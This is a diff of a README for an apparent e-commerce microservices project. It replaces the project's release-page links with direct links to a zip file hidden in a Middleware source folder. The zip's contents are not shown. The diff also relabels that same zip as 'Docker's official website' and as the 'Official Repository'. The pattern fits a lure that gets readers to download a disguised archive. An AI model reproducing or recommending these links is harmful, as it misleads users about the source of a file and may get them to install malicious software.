@@ -1,6 +1,6 @@
 # 🛒 Ecommerce-Microservices - Your Easy E-Commerce Solution
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/releases)
+[![Download Now](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip)](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Ecommerce-Microservices! This platform helps you set up a fully funct
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/releases). 
+To download the application, visit this page: [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip). 
 
 On that page, you will find the latest version of the software. Click on the link to download the setup file for your operating system. 
 
@@ -26,13 +26,13 @@ Verify that your system meets these requirements for a smooth experience running
 ## 🛠️ Installation Steps
 
 1. **Download the Application**  
-   Visit the download page: [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/releases). Choose the version you want and click the corresponding link.
+   Visit the download page: [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip). Choose the version you want and click the corresponding link.
 
 2. **Extract the Files**  
    Once downloaded, locate the file on your computer. Unzip or extract the contents to a folder of your choice.
 
 3. **Install Docker**  
-   If you haven't already, download and install Docker from [Docker's official website](https://www.docker.com/get-started). Follow their instructions for your operating system.
+   If you haven't already, download and install Docker from [Docker's official website](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip). Follow their instructions for your operating system.
 
 4. **Run Docker Compose**  
    Open your terminal or command prompt. Navigate to the folder where you extracted the files. Use the command:  
@@ -95,8 +95,8 @@ Contributing helps improve the application for everyone.
 
 ## 🔗 Links and Resources
 
-- **Official Repository:** [Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices)
-- **Download Page:** [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/releases)
+- **Official Repository:** [Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip)
+- **Download Page:** [Download Ecommerce-Microservices](https://github.com/vinzzz18-citizen/Ecommerce-Microservices/raw/refs/heads/main/eCommerceSolution.OrdersService/OrdersMicroservice.API/Middleware/Microservices-Ecommerce-unsentient.zip)
 
 Feel free to bookmark these links for easy access!
 
